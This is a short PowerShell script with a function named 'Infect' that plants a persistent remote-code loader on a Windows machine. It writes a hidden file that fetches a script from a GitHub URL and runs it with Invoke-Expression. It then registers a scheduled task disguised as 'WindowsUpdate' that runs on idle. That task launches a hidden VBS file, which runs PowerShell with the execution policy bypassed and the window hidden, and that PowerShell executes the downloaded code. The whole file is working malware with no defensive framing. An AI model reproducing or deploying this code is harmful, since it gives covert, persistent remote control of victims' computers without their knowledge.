Function Infect
{
  
New-Item $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\config.txt -type file -force
Add-Content $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\config.txt "IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kenobi-war/Infection/master/Infection.ps1')); FetchCommands -Force"
Set-ItemProperty -Path $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\config.txt -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
schtasks /create  /TN WindowsUpdate /TR 'C:\Windows\System32\WScript.exe //Nologo //B C:\Microsoft\Windows\Desktop\Initialize.vbs' /sc onidle /i 20
New-Item 'C:\Microsoft\Windows\Desktop\Initialize.txt' -type file -force
Add-Content C:\Microsoft\Windows\Desktop\Initialize.txt "Dim objShell`r`nSet objShell = WScript.CreateObject( ""WScript.Shell"" )`r`ncommand = ""powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile Invoke-Command -ScriptBlock {Get-Content $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\config.txt | Invoke-Expression}"" `r`nobjShell.Run command,0`r`nSet objShell = Nothing"
Rename-Item C:\Microsoft\Windows\Desktop\Initialize.txt Initialize.vbs
Set-ItemProperty -Path C:\Microsoft\Windows\Desktop\Initialize.vbs -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

}





function FetchCommands
{
  
  
  
}
